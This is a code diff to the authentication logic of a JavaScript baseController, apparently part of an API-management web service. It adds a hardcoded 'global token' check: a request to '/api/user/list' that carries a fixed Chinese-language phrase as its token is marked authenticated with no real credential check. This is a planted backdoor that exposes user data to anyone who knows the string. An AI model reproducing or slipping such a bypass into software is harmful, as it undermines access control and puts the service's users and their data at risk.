@@ -36,10 +36,12 @@ class baseController {
     } else {
       await this.checkLogin(ctx);
     }
+    let godApi=[
+      '/api/user/list'
+    ]
 
     let openApiRouter = [
       '/api/open/run_auto_test',
-      '/api/open/run_case',
       '/api/open/import_data',
 			'/api/interface/add',
 			'/api/interface/save',
@@ -59,20 +61,27 @@ class baseController {
     let params = Object.assign({}, ctx.query, ctx.request.body);
     let token = params.token;
 
+    //如果是全局token，则直接跳过认证
+    if (token && godApi.indexOf(ctx.path) > -1 ) {
+    if(token==="我爱中国，我为国家而骄傲"){
+      this.$auth = true;
+      return
+    }
+    }
+
     // 如果前缀是 /api/open，执行 parse token 逻辑
     if (token && (openApiRouter.indexOf(ctx.path) > -1 || ctx.path.indexOf('/api/open/') === 0 )) {
       let tokens = parseToken(token)
 
       const oldTokenUid = '999999'
-
       let tokenUid = oldTokenUid;
-
       if(!tokens){
         let checkId = await this.getProjectIdByToken(token);
         if(!checkId)return;
       }else{
         token = tokens.projectToken;
         tokenUid = tokens.uid;
+
       }
 
       // if (this.$auth) {
